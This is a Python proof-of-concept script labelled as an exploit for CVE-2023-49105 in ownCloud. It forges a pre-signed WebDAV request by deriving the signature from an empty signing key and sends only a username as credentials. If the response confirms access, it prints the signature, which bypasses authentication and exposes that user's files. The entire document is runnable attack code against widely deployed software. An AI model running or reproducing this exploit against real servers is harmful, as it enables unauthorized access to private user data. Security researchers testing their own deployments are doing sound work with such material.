import argparse
import sys
import datetime
import base64
import hashlib
from urllib.parse import urljoin, urlencode
from requests import Request, Session


proxies = {}
#proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def send_raw(url, params, auth_header):
    s = Session()
    req = Request('PROPFIND', url, params=params)

    prepped = req.prepare()
    prepped.headers['Content-Type'] = 'text/xml'
    prepped.headers['Authorization'] = f'Basic {auth_header}'
    response = s.send(prepped, verify=False, proxies=proxies)
    return response


def main():

    parser = argparse.ArgumentParser(description='CVE-2023-49105 exploit')
    parser.add_argument('url', help='http://localhost:8080/owncloud')
    parser.add_argument('user', help='user to test access e.g. "admin"')

    args = parser.parse_args()

    # build url from user input
    url = f'{args.url}/remote.php/dav/files/{args.user}'
    # now
    oc_date = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
    # the username is required in the Basic Auth header
    auth_header = base64.b64encode(args.user.encode()).decode()

    # query params and a larger expiry date
    data = {
        'OC-Expires': '991200',
        'OC-Verb': 'PROPFIND',
        'OC-Credential': args.user,
        'OC-Date': oc_date
    }

    sig_url = f'{url}?{urlencode(data)}'
    # derive signature from empty sign key
    dk = hashlib.pbkdf2_hmac('sha512', sig_url.encode(), b'', 10000, dklen=32)
    # append the signature to the parameters
    data['OC-Signature'] = dk.hex()

    response = send_raw(url, data, auth_header)
    if response.status_code != 207:
        print(f"Invalid status code {response.status_code}")
        if b"User unknown" in response.content:
            print('Received unknown user error! try another user')
        sys.exit(1)
    if f"/remote.php/dav/files/{args.user}".encode() in response.content:
        print(f"Vulnerable! Access the data using the following signature:\n{dk.hex()}")

if __name__ == '__main__':
    main()
